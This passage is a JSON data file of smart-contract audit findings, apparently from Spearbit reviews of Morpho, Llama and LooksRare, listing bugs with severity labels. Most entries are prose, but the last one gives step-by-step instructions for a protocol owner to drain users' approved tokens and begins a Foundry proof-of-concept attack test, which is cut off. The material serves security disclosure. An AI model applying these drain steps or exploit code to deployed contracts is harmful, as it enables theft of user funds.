        "body": "On Compound, when an error condition occurs, usually (except in extreme cases) the transaction is not reverted, and instead an error code (code !== 0) is returned. Morpho correctly reverts with a custom error when this happens, but is not reporting the error code returned by Compound. By tracking, as an event parameter, the error code, Morpho could better monitor when and why interactions with Compound are failing.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "liquidationThreshold variable name can be misleading",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The liquidationThreshold name in Aave is a percentage. The values.liquidationThreshold variable used in Morpho's _getUserHealthFactor is in \"value units\" like debt: values.liquidationThreshold = assetCollateralValue.percentMul(assetData.liquidationThreshold);.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Users can be liquidated on Morpho at any time when the deprecation flag is set by governance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "Governance can set a deprecation flag on Compound and Aave markets, and users on this mar- ket can be liquidated by anyone even if they're sufficiently over-collateralized. Note that this deprecation flag is independent of Compound's own deprecation flags and can be applied to any market.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "Refactor _computeP2PIndexes to use InterestRateModel's functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf",
        "body": "The InterestRatesManager contracts' _computeP2PIndexes functions currently reimplement the interest rate model from the InterestRatesModel functions.",
        "labels": [
            "Spearbit",
            "MorphoV1",
            "Severity: Informational"
        ]
    },
    {
        "title": "The castApprovalBySig and castDisapprovalBySig functions can revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The castApprovalBySig and castDisapprovalBySig functions are used to cast an approve or disapprove via an off-chain signature. Within the _preCastAssertions a check is performed against the strategy using msg.sender instead of policy- holder, the strategy (e.g. AbsoluteStrategy) uses that argument to check if the cast sender is a policyholder. isApproval ? actionInfo.strategy.isApprovalEnabled(actionInfo, msg.sender) : actionInfo.strategy.isDisapprovalEnabled(actionInfo, msg.sender); While this works for normal cast, using the ones with signatures will fail as the sender can be anyone who calls the method with the signature signed off-chain.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "The castApproval/castDisapproval doesn't check if role parameter is the approvalRole",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "A policyholder should be able to cast their approval for an action if they have the approvalRole defined in the strategy. It should not be possible for other roles to cast an action. The _castApproval method verifies if the policyholder has the role passed as an argument but doesn't check if it actually has approvalRole which is eligible to cast an approval. This means any role in the llama contract can participate in the approval with completely different quantities (weights). The same problem occurs for the castDisapproval function as well.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Reducing the quantity of a policyholder results in an increase instead of a decrease in totalQuan- tity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "In Llama policyholder can approve or disapprove actions. Each policyholder has a quantity which represents their approval casting power. It is possible to update the quantity of individual policyholder with the setRoleHolder function in the LlamaPolicy. The _setRoleHolder method is not handling the decrease of quantity correctly for the totalQuantity. The totalQuantity describes the sum of the quantities of the individual policyholders for a specific role. In the case of a quantity change, the difference is calculated as follows: uint128 quantityDiff = initialQuantity > quantity ? initialQuantity - quantity : quantity - ,! initialQuantity; However, the quantityDiff is always added instead of being subtracted when the quantity is reduced. This results in an incorrect tracking of the totalQuantity. Adding the quantityDiff should only happen in the increase case. See: LlamaPolicy.sol#L388 // case: willHaveRole=true, hadRoleQuantity=true newTotalQuantity = currentRoleSupply.totalQuantity + quantityDiff;",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: High Risk"
        ]
    },
    {
        "title": "LlamaPolicy.revokePolicy cannot be called repeatedly and may result in burned tokens retaining active roles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Llama has two distinct revokePolicy functions. The first revokePolicy function removes all roles of a policyholder and burns the associated token. This function iterates over all existing roles, regardless of whether a policyholder still holds the role. In the next step the token is burned. If the total number of roles becomes too high, this transaction might not fit into one block. A second version of the revokePolicy function allows users to pass an array of roles to be removed. This approach should enable the function to be called multiple times, thus avoiding an \"out-of-gas\" error. An out-of-gas error is currently not very likely considering the maximum possible role number of 255. However, the method exists and could be called with a subset of the roles a policyholder. The method contains the following check: if (balanceOf(policyholder) == 0) revert AddressDoesNotHoldPolicy(policyholder); Therefore, it is not possible to call the method multiple times. The result of a call with a subset of roles would lead to an inconsistent state. The token of the policyholder is burned, but the policyholder could still use the remaining roles in Llama. Important methods like LlamaPolicy.hasRole don't check if LlamaPolicy.sol#L250) the token has been burned. (See",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Role, permission, strategy, and guard management or config errors may prevent creating/approving/queuing/executing actions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "LlamaCore deployment from the factory will only succeed if one of the roles is the BOOTSTRAP_ROLE. As the comments note: // There must be at least one role holder with role ID of 1, since that role ID is initially // given permission to call `setRolePermission`. This is required to reduce the chance that an // instance is deployed with an invalid configuration that results in the instance being unusable. // Role ID 1 is referred to as the bootstrap role. There are still several ways a user can misstep and lose access to LlamaCore.  Bootstrap Role Scenarios While the bootstrap role is still needed: 1. Setting an expiry on the bootstrap role's policyholder RoleHolderData and allowing the timestamp to pass. Once passed any caller may remove the BOOTSTRAP_ROLE from expired policyholders. 2. Removing the BOOTSTRAP_ROLE from all policyholders. 3. Revoking the role's permission with setRolePermission(BOOTSTRAP_ROLE, bootstrapPermissionId, false).  General Roles and Permissions Similarly, users may allow other permissions to expire, or remove/revoke them, which can leave the contract in a state where no permissions exist to interact with it. The BOOTSTRAP_- ROLE would need to be revoked or otherwise out of use for this to be a problem.  Misconfigured Strategies A misconfigured strategy may also result in the inability to process new actions. For example: 1. Setting minApprovals too high. 2. Setting queuingPeriod unreasonably high 3. Calling revokePolicy when doing so would make policy.getRoleSupplyAsQuantitySum(approvalRole) fall below minApprovals (or fall below minApprovals - actionCreatorApprovalRoleQty). 1 & 2 but applied to disapprovals. And more, depending on the strategy (e.g. if a strategy always responded true to isActive).  Removal of Strategies It should not be possible to remove the last strategy of a Llama instance It is possible to remove all strategies from an Ilama instance. It would not be possible to create a new action afterward. An action is required to add other strategies back. As a result, the instance would become unusable, and access to funds locked in the Accounts would be lost.  Misconfigured Guards An accidentally overly aggressive guard could block all transactions. There is a built-in protection to prevent guards from getting in the way of basic management if (target == address(this) || target == address(policy)) revert CannotUseCoreOrPolicy();. Again, the BOOTSTRAP_ROLE would need to be revoked or otherwise out of use for this to be a problem.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LlamaPolicy.hasRole doesn't check if a policyholder holds a token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Incorrect usage of the revokePolicy function can result in a case, where the token of a policyholder is already burned but still holds a role. The hasRole function doesn't check if in addition to the role the policyholder still holds the token to be active. The role could still be used in the Llama system.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect isActionApproved behavior if new policyholders get added after the createAction in the same block.timestamp",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Llama utilizes Checkpoints to store approval quantities per timestamp. If the current quantity changes, the previous values are preserved. The block.timestamp of createAction is used as a snapshot for the approval. (See: LlamaCore.sol#L597) Thus, in addition to the Checkpoints, the totalQuantity or numberOfHolders at the createAction are included in the snapshot. However, if new policyholders are added or their quantities change after the createAction within the same block.timestamp, they are not considered in the snapshot but remain eligible to cast an approval. For example, if there are four policyholders together 50% minimum approval: If a new action is created and two policyholders are added subsequently within the same block.timestamp. 9 The numberOfHolders would be 4 in the snapshot instead of 6. All 6 policyholders could participate in the approval, and two approvals would be sufficient instead of 4. Adding new policyholders together with creating a new action could happen easily in a llama script, which allows to bundle different actions. If a separate action is used to add a new policyholder, the final execution happens via a public callable function. An attacker could exploit this by trying to execute the add new policyholder action if a new action is created",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LlamaCore delegate calls can bring Llama into an unusable state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The core contract in Llama allows the execution of actions through a delegate_call. An action is executed as a delegate_call when the target is added as an authorizedScript. This enables batching multiple tasks into a contract, which can be executed as a single action. In the delegate_call, a script contract could modify arbitrary any slot of the core contract. The Llama team is aware of this fact and has added additional safety-checks to see if the slot0 has been modified by the delegate_call. The slot0 contains values that should never be allowed to change. bytes32 originalStorage = _readSlot0(); (success, result) = actionInfo.target.delegatecall(actionInfo.data); if (originalStorage != _readSlot0()) revert Slot0Changed(); A script might be intended to modify certain storage slots. However, incorrect SSTORE operations can completely break the contracts. For example, setting actionsCount = type(uint).max would prevent creating any new actions, and access to funds stored in the Account would be lost.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The execution opcode of an action can be changed from call to delegate_call after approval",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "In Llama an action only defines the target address and the function which should be called. An action doesn't implicitly define if the opcode should be a call or a delegate_call. This only depends on whether the target address is added to authorizedScripts mapping. However, adding a target to the authorizedScripts can be done after the approval in a different action. The authorizedScript action could use a different set of signers with a different approval strategy. The change of adding a target to authorizedScript should not impact actions which are already approved and in the queuing state. This could lead to security issues when policyholders approved the action under the assumption the opcode will be a call instead of a delegate call.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LlamaFactory is governed by Llama itself",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Llama uses their own governance system to govern the LlamaFactory contract. The LlamaFactory contract is responsible for authorizing new LlamaStrategies. We can identify several potential drawbacks with this approach. If only a single strategy contract is used and a critical bug is discovered, the implications could be significant. In such a scenario, it would mean a broken strategy contract needs to be used by the Factory governance to deploy a fixed version of the strategy contract or enable other strategies. The likelihood for this to happen is still low but implications could be critical.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The permissionId doesn't include call or delegate-call for LlamaAccount.execute",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The decision if LlamaAccount.execute is a delegate_call depends on the bool flag parameter withDelegatecall. This parameter is not included in the permissionId, which controls role permissions in Llama. The permissionId in Llama is calculated in the following way: PermissionData memory permission = PermissionData(target, bytes4(data), strategy); bytes32 permissionId = keccak256(abi.encode(permission)); The permissionId required for a role to perform an action only includes the function signature but not the param- eters themselves. It is impossible to define the opcode as part of the permissionId.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Nonconforming EIP-712 typehash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Incorrect strings used in computing the EIP-712 typehash. 1. The strings contain space( ) after comma(,) which is not standard EIP-712 behaviour. 2. ActionInfo is not used in typehash. There will be a mismatch when comparing to hashes produced by JS libs or solidity (if implemented), etc.. Not adhering to EIP-712 spec means wallets will not render correctly and any supporting tools will produce a different typehash.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Various events do not add the role as parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Note: During the audit, the client discovered an issue that affects their offchain infrastructure. Various events do not emit the role as parameter: 1. event ActionCreated(uint256 id, address indexed creator, ILlamaStrategy indexed strategy, address indexed target, uint256 value, bytes data, string description); 2. event ApprovalCast(uint256 id, address indexed policyholder, uint256 quantity, string reason); 3. event DisapprovalCast(uint256 id, address indexed policyholder, uint256 quantity, string reason);",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "LlamaCore doesn't check if minExecutionTime returned by strategy is in the past",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The minExecutionTime returned by a strategy is not validated.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Address parsing from tokenId to address string does not account for leading 0s",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Policy tokenIds are derived from the holder's account address. The address is intended to be displayed in the svg generated when calling tokenURI. Currently, leading 0s are truncated rendering the incorrect address string: e.g. 0x015b... vs 0x0000...be60 for address 0x0000000000015B23C7e20b0eA5eBd84c39dCbE60.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The ALL_HOLDERS_ROLE can be set as a force role by mistake",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "During the initialization, an array of roles that must be assigned as force approval/disapproval can be sent. The logic does not account for ALL_HOLDERS_ROLE (which is role id 0, the default value of uint8) which can be sent as a mistake by the user. This is a low issue as if the above scenario happens, the strategy can become obsolete which will render the owner redeploy the strategy with correct initialization configs. We must mention that the force roles can not be changed after they are set within the initialization.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "LlamaPolicy.setRolePermission allows to set permissions for non existing roles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "It is possible to set a permission for a role that doesn't exist, yet. In other functions like assigning a role to a policyholder, this check happens. (See: LlamaPolicy.sol#L343) A related issue, very close to this, is the updateRoleDescription method which can emit an event for a role that does not exists. This is just an informational issue as it does not affect with anything the on-chain logic, might affect off-chain logic if any logic will ever rely on it.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The RoleAssigned event in LlamaPolicy emits the currentRoleSupply instead of the quantity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "During the audit, the client discovered an issue that affects their off-chain infrastructure. The RoleAssigned event in LlamaPolicy emits the currentRoleSupply instead of the quantity. From an off-chain perspective, there is currently no way to get the quantity assigned for a role to a policyholder at Role Assignment time. The event would be more useful if it emitted quantity instead of currentRoleSupply (since the latter can be just be calculated off-chain from the former).",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ETH can remain in the contract if msg.value is greater than expected",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "When an action is created, the creator can specify an amount of ETH that needs to be sent when executing the transaction. This is necessary in order to forward ETH to a target call. Currently, when executing the action the msg.value is checked to be at least the required amount of ETH needed to be forwarded. if (msg.value < actionInfo.value) revert InsufficientMsgValue(); This can result in ETH remaining in the contract after the execution. From our point of view, LlamaCore should not hold any balance of ETH.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cannot re-authorize an unauthorized strategy config",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Strategies are deployed using a create2 salt. The salt is derived from the strategy config itself (see LlamaCore.sol#L709-L710). This means that any unauthorized strategy cannot be used in the future, even if a user decides to re-enable it.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Signed messages may not be cancelled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Creating, approving, and disapproving actions may all be done by signing a message and having another account call the relevant *BySig function. Currently, there is no way for a signed message to be revoked without a successful *BySig function call containing the nonce of the message to be revoked.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "LlamaCore name open to squatting or impersonation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "When deploying a LlamaCore clone, the create2 salt is derived from the name. This means that no two may have the same name, and name squatting, or impersonation, may occur.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Expired policyholders are active until they are explicitly revoked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Each policyholder in Llama has an expiration timestamp. However, policyholder can still use the power of their role after the expiration has passed. The final revoke only happens after the public LlamaPolicy.revokeExpiredRole method is called. Anyone can call this method after the expiration timestamp is passed. For the Llama system to function effectively with role expiration, it is essential that external keepers vigilantly monitor the contract and promptly revoke expired roles. A final revoke exactly at the expiration can not be guaranteed.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Gas optimizations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Throughout the codebase we've identified gas improvements that were aggregated into one issue for a better management. RelativeStrategy.sol#L159  The if (disapprovalPolicySupply == 0) revert RoleHasZeroSupply(disapprovalRole); check and actionDisapprovalSupply[actionInfo.id] = disapprovalPolicySupply; can be wrapped in an if block in case disapprovals are enabled  The uint128 newNumberOfHolders; and uint128 newTotalQuantity; variables are obsolete as the up- dates on the currentRoleSupply can be done in the if branches. LlamaPolicy.sol#L380-L392  The exists check is redundant LlamaPolicy.sol#L252  The _validateActionInfoHash(action.infoHash, actionInfo); is redundant as it's already done in the getActionState LlamaCore.sol#L292 LlamaCore.sol#L280 LlamaCore.sol#L672  Finding the BOOTSTRAP_ROLE in the LlamaFactory._deploy could happen by expecting the role at a cer- tain position like position 0 instead of paying gas for an on-chain search operation to iterate the array. LlamaFactory.sol#L205  quantityDiff calculation guaranteed to not overflow as the ternary checks initialQuantity > quantity before subtracting.  Infeasible for numberOfHolders and totalQuantity to overflow. See also LlamaPolicy.sol#L422-L423  Infeasible for numberOfHolders to overflow.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unused code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Various parts of the code is unused or unnecessary.  CallReverted and MissingAdmin in LlamaPolicy.sol#L27-L29  DisapprovalThresholdNotMet in RelativeStrategy.sol#L28  Unused errors in LlamaCore.sol InvalidCancelation, ProhibitedByActionGuard, ProhibitedByStrategy, ProhibitedByStrategy(bytes32 reason) and RoleHasZeroSupply(uint8 role)  /// - Action creators are not allowed to cast approvals or disapprovals on their own actions, The comment is inaccurate, this strategy, the creators have no restrictions on their actions. RelativeStrategy.sol#L19 17",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Duplicate storage reads and external calls",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "When creating, approving, disapproving, queuing, and executing actions, there are calls between the various contracts in the system. Due to the external calls, the compiler will not cache storage reads, meaning the gas cost of warm sloads is incurred multiple times. The same is true for view function calls between the contracts. A number of these calls are returning the same value multiple times in a transaction.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider clones-with-immutable-args",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The cloned contracts have immutable values that are written to storage on initialization due to proxies being used. Reading from storage costs extra gas but also puts some of the storage values at risk of being overwritten when making delegate calls.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The domainSeperator may be cached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The domainSeperator is computed for each use. Some gas may be saved by using caching and deferring to the cached value.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Prefer on-chain SVGs or IPFS links over server links for contractURI",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Llama uses on-chain SVG for LlamaPolicy.tokenURI. The same could be implemented for LlamaPolicy.contractURI as well. In general IPFS links or on-chain SVG for visual representations provide better properties than centralized server links.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider making the delegate-call scripts functions only callable by delegate-call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "An additional safety check could be added to scripts if a function should be only callable via a delegate-call.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing tests for SingleUseScript.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "There are no tests for SingleUseScript.sol in Llama.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Role not available to Guards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Use cases where Guards require knowing the creation or approval role for the action are not sup- ported. ActionInfo does reference the strategy, and the two implemented strategies do have public functions referencing the approvalRole, allowing for a workaround. However, this is not mandated by the ILlamaStrategy interface and is not guaranteed to be present in future strategies.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Global guards are not supported",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Other protocols use of guards applies them to the account (i.e. globally). In other words, if global guards existed and if there are some properties you know to apply to the entire LlamaCore instance a global guard could be applied. The current implementation allows granular control, but it also requires granular control with no ability to set global guards.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using _disableInitializers in constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "OpenZeppelin added the _disableInitializers() in 4.6.0 which prevents initialization of the im- plementation contract and recommends its use.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Revoking and setting a role edge cases",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "This issue highlights a number of edge-case behaviors 1. Calling setRoleHolder passing in an account with balanceOf == 0, 0 quantity, and 0 expiration results in minting the NFT. 2. Revoking all policies through revokeExpiredRole leaves an address with no roles except for the ALL_- HOLDERS_ROLE and a balanceOf == 1. 3. Revoking may be conducted on policies the address does not have (building on the previous scenario):  Alice is given role 1 with expiry.  Expiry passes.  Anyone calls revokeExpiredRole.  Role is revoked but Alice still has balanceOf == 1.  LlamaCore later calls revokePolicy with roles array of [2].  A role Alice never had is revoked.  The NFT is burned.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use built in string.concat",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The solidity version used has a built-in string.concat which can replace the instances of string(abi.encodePacked(...). The client notes there are no gas implications of this change while the change does offer semantic clarity.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistencies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Throughout the codebase, we've encountered some inconsistencies that we decided to point out. for(uint256 i = 0... is not used everywhere e.g. AbsoluteStrategy.sol#L130  Sometimes, a returned value is not named. e.g. named return value function createAction( uint8 role, ILlamaStrategy strategy, address target, uint256 value, bytes calldata data, string memory description ) external returns (uint256 actionId) { unnamed return value function createActionBySig( uint8 role, ILlamaStrategy strategy, address target, uint256 value, bytes calldata data, address policyholder, uint8 v, bytes32 r, bytes32 s ) external returns (uint256) {  Missing NatSpec on various functions. e.g. LlamaPolicy.sol#L102  _uncheckedIncrement is not used everywhere.  Naming of modifiers In all contracts the onlyLlama modfiier only refers to the llamaCore. The only exception is LlamaPolicyMetadataParamRegistry which has the same name but refers to llamaCore and rootLlama but is called onlyLlama. See LlamaPolicyMetadataParamRegistry.sol#L16  Console.log debug output in RelativeStrategy console.log in RelativeStrategy See: RelativeStrat- egy.sol#L215  In GovernanceScript.sol both of SetRolePermission and SetRoleHolder mirror structs defined in the shared lib/Structs.sol file. Additionally, some contracts declare their own structs over inheriting all structs from lib/Structs.sol:  LlamaAccount  GovernanceScript  LlamaPolicy Recommend removing duplicate structs and, where relevant, continue making use of the shared Structs.sol for struct definitions.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Policyholders with large quantities may not both create and exercise their large quantity for the same action",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The AbsoluteStrategy removes the action creator from the set of policyholders who may approve / disapprove an action. This is a departure from how the RelativeStrategy handles action creators. Not permitting action creators to approve / disapprove is simple to reason about when each policyholder has a quantity of 1; creating can even be thought of an implicit approval and may be factored in when choosing a minApprovals value. However, in scenarios where a policyholder has a large quantity (in effect a large weight to their casted approval), creating an action means they forfeit the use of the vast majority of their quantity for that particular action.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "The roleBalanceCheckpoints can run out of gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The roleBalanceCheckpoints function returns the Checkpoints history of a balance. This check will copy into memory the whole history which can end up in a out of gas error. This is an informational issue as this function was designed for off-chain usage and the caller can use eth_call with a higher gas limit.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "GovernanceScript.revokeExpiredRoles should be avoided in favor of calling LlamaPol- icy.revokeExpiredRole from EOA",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "GovernanceScript.revokeExpiredRoles is intended to be delagate called from LlamaCore. Given that LlamaPolicy.revokeExpiredRole is already public and without access controls, it will always be cheaper, and less complex, to call directly from an EOA or batching a multicall, again from an EOA.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "The InvalidActionState can be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Currently, the InvalidActionState includes the expected state as an argument, this is unnecessary as you can derive the state from the method call, would make more sense to take the current state instead of the expected state.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "_uncheckedIncrement function written in multiple contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Multiple contracts make use of an _uncheckedIncrementfunction and each duplicates the function definition. Similarly the slot0 function appears in both LlamaAccount and LlamaCore and _toUint64 appears in the two strategy contracts plus LlamaCore.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "The Protocol owner can drain users' currency tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "The Protocol owner can drain users' currency tokens that have been approved to the protocol. Makers who want to bid on NFTs would need to approve their currency token to be spent by the protocol. The owner should not be able to access these funds for free. The owner can drain the funds as follows: 1. Calls addTransferManagerForAssetType and assigns the currency token as the transferManagerForAs- setType and IERC20.transferFrom.selector as the selectorForAssetType for a new assetType. 2. Signs an almost empty MakerAsk order and sets its collection as the address of the targeted user and the assetType to the newly created assetType. The owner also creates the corresponding TakerBid by setting the recipient field to the amount of currency they would like to transfer. 3. Calls the executeTakerBid endpoint with the above data without a merkleTree or affiliate. // file: test/foundry/Attack.t.sol pragma solidity 0.8.17; import {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\"; import {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\"; import {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\"; import {ProtocolBase} from \"./ProtocolBase.t.sol\"; import {MockERC20} from \"../mock/MockERC20.sol\"; contract NullStrategy is IBaseStrategy { function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function executeNull( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ ) external pure returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) {} } 5 contract AttackTest is ProtocolBase { NullStrategy private nullStrategy; MockERC20 private mockERC20; uint256 private signingOwnerPK = 42; address private signingOwner = vm.addr(signingOwnerPK); 